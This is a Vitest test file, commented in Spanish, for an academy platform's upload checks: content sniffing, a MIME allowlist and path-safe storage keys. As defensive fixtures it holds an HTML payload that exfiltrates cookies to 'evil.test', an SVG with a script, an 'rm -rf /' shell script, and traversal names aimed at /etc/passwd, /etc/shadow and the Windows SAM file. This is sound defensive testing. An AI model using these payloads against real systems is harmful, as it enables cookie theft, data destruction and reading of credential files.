import path from "node:path";
import { describe, expect, it } from "vitest";
import {
  ALLOWED_MIME,
  buildStorageKey,
  claveEsDeLaAcademia,
  isAllowedMime,
  motivoParaNoAceptar,
} from "@/lib/storage";

/**
 * SUBIDA DE ARCHIVOS · lo que no puede entrar
 *
 * La comprobación que había miraba `file.type`, y ese valor lo pone el
 * navegador a partir de la extensión: renombrar `algo.html` a `algo.pdf` bastaba
 * para que llegara etiquetado como `application/pdf`. Una lista blanca de tipos
 * filtra una etiqueta, no un contenido.
 *
 * Servir un HTML desde el dominio de Geminis es lo que hay que impedir: sería
 * un script ejecutándose con la sesión de quien lo abra. Hoy hay dos cosas más
 * que lo tapan —la respuesta va con `nosniff` y con `script-src 'none'`— pero
 * ninguna es razón para aceptar el archivo, porque las dos son de la capa de
 * entrega y esto es de la de entrada.
 */

/** Un PDF mínimo pero con la firma correcta. */
const PDF = Buffer.concat([
  Buffer.from("%PDF-1.7\n"),
  Buffer.from("1 0 obj\n<< /Type /Catalog >>\nendobj\n"),
]);

const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13]);
const JPEG = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0x10, 0x4a, 0x46]);
const DOCX = Buffer.concat([
  Buffer.from([0x50, 0x4b, 0x03, 0x04]),
  Buffer.alloc(40),
]);

const DOCX_MIME =
  "application/vnd.openxmlformats-officedocument.wordprocessingml.document";

describe("subida · los archivos legítimos entran", () => {
  it("acepta un PDF de verdad", () => {
    expect(motivoParaNoAceptar(PDF, "application/pdf")).toBeNull();
  });

  it("acepta imágenes", () => {
    expect(motivoParaNoAceptar(PNG, "image/png")).toBeNull();
    expect(motivoParaNoAceptar(JPEG, "image/jpeg")).toBeNull();
  });

  it("acepta un documento de Office", () => {
    expect(motivoParaNoAceptar(DOCX, DOCX_MIME)).toBeNull();
  });

  it("acepta un texto plano, que no tiene firma que comprobar", () => {
    // Exigirle una firma a un formato que no la tiene sería inventarse una
    // comprobación, y el efecto sería rechazar archivos válidos.
    expect(
      motivoParaNoAceptar(Buffer.from("Tema 1. La Constitución.\n"), "text/plain"),
    ).toBeNull();
  });
});

describe("subida · lo que se hace pasar por otra cosa", () => {
  it("rechaza un HTML disfrazado de PDF", () => {
    const html = Buffer.from(
      "<!DOCTYPE html><html><body><script>fetch('//evil.test?c='+document.cookie)</script></body></html>",
    );
    expect(motivoParaNoAceptar(html, "application/pdf")).toMatch(/HTML/i);
  });

  it("rechaza un HTML disfrazado de texto plano", () => {
    // Este es el que se colaría por la puerta de atrás: `text/plain` no tiene
    // firma, así que sin la lista de prohibidos pasaría entero.
    const html = Buffer.from("<html><body>hola</body></html>");
    expect(motivoParaNoAceptar(html, "text/plain")).toMatch(/HTML/i);
  });

  it("rechaza un SVG disfrazado de imagen", () => {
    // Un SVG es un documento con scripts dentro, no una imagen inerte.
    const svg = Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    );
    expect(motivoParaNoAceptar(svg, "image/png")).not.toBeNull();
    expect(motivoParaNoAceptar(svg, "text/plain")).not.toBeNull();
  });

  it("rechaza un ejecutable de Windows disfrazado de PDF", () => {
    const exe = Buffer.concat([Buffer.from([0x4d, 0x5a]), Buffer.alloc(60)]);
    expect(motivoParaNoAceptar(exe, "application/pdf")).toMatch(/Windows/i);
  });

  it("rechaza un binario de Linux y un guion de consola", () => {
    const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.alloc(20)]);
    expect(motivoParaNoAceptar(elf, "application/pdf")).not.toBeNull();

    const guion = Buffer.from("#!/bin/sh\nrm -rf /\n");
    expect(motivoParaNoAceptar(guion, "text/plain")).not.toBeNull();
  });

  it("rechaza una imagen que no es esa imagen", () => {
    // JPEG declarado, PNG dentro: no es un ataque, pero es un archivo que se
    // servirá con el tipo equivocado y no se abrirá.
    expect(motivoParaNoAceptar(PNG, "image/jpeg")).not.toBeNull();
    expect(motivoParaNoAceptar(JPEG, "image/png")).not.toBeNull();
  });

  it("rechaza un archivo vacío o basura declarado como PDF", () => {
    expect(motivoParaNoAceptar(Buffer.alloc(0), "application/pdf")).not.toBeNull();
    expect(motivoParaNoAceptar(Buffer.alloc(100, 0xab), "application/pdf")).not.toBeNull();
  });

  it("el mensaje de rechazo no es un manual de cómo saltárselo", () => {
    const html = Buffer.from("<html></html>");
    const motivo = motivoParaNoAceptar(html, "application/pdf") ?? "";
    // Dice qué pasa, no qué bytes habría que poner.
    expect(motivo).not.toMatch(/0x|firma|magic|byte/i);
  });
});

describe("subida · la lista blanca de tipos sigue en su sitio", () => {
  it("no admite tipos peligrosos aunque el contenido cuadrara", () => {
    for (const mime of [
      "text/html",
      "image/svg+xml",
      "application/xhtml+xml",
      "application/javascript",
      "application/x-msdownload",
      "application/octet-stream",
      "",
    ]) {
      expect(isAllowedMime(mime), `${mime} no debería admitirse`).toBe(false);
    }
  });

  it("admite los que la academia necesita de verdad", () => {
    for (const mime of ["application/pdf", "image/png", "video/mp4", DOCX_MIME]) {
      expect(isAllowedMime(mime), `${mime} debería admitirse`).toBe(true);
    }
    expect(Object.keys(ALLOWED_MIME).length).toBeGreaterThan(10);
  });
});

describe("subida · el nombre del archivo nunca es una ruta", () => {
  const ACADEMIA = "01a05730-fa6b-72fb-bb33-05d22766b945";

  it("un nombre con «..» no se sale de la carpeta de la academia", () => {
    for (const nombre of [
      "../../../../etc/passwd",
      "..\\..\\..\\Windows\\System32\\config\\SAM",
      "/etc/shadow",
      "C:\\secreto.txt",
      "....//....//etc/passwd",
      "tema/../../otro.pdf",
    ]) {
      const clave = buildStorageKey(ACADEMIA, nombre);

      expect(clave.startsWith(`academies/${ACADEMIA}/`)).toBe(true);
      expect(claveEsDeLaAcademia(clave, ACADEMIA)).toBe(true);

      /*
       * Lo que importa no es que desaparezcan los puntos, sino que no quede
       * ningún SEPARADOR de ruta. Sin barras, `..-..-etc-passwd` es un nombre
       * de archivo tan corriente como cualquier otro: los dos puntos solo
       * significan «carpeta de arriba» cuando van solos entre separadores.
       */
      const parteDelUsuario = clave.split("/").slice(3).join("/");
      expect(parteDelUsuario).not.toContain("/");
      expect(parteDelUsuario).not.toContain("\\");
      expect(parteDelUsuario.split(/[/\\]/)).not.toContain("..");

      // Y la comprobación que zanja el asunto: resolver la clave contra una
      // raíz cualquiera no puede acabar fuera de esa raíz, que es exactamente
      // lo que hace el almacén en disco antes de escribir.
      const raiz = path.resolve("/almacen");
      expect(path.resolve(raiz, clave).startsWith(raiz)).toBe(true);
    }
  });

  it("un nombre con caracteres raros o Unicode no rompe la clave", () => {
    for (const nombre of [
      "tema ñ áéíóú.pdf",
      "tema\u0000oculto.pdf",
      "tema\nnueva-linea.pdf",
      "临时文件.pdf",
      "a".repeat(500) + ".pdf",
      "",
    ]) {
      const clave = buildStorageKey(ACADEMIA, nombre);
      expect(claveEsDeLaAcademia(clave, ACADEMIA)).toBe(true);
      expect(clave.split("/")).toHaveLength(4);
    }
  });

  it("dos archivos con el mismo nombre no se pisan", () => {
    const a = buildStorageKey(ACADEMIA, "Tema 1.pdf");
    const b = buildStorageKey(ACADEMIA, "Tema 1.pdf");
    expect(a).not.toBe(b);
  });

  it("la clave de una academia no vale para otra", () => {
    const otra = "01a05730-fa6b-72fb-bb33-05d22766b946";
    const clave = buildStorageKey(ACADEMIA, "Tema 1.pdf");
    expect(claveEsDeLaAcademia(clave, otra)).toBe(false);
  });
});
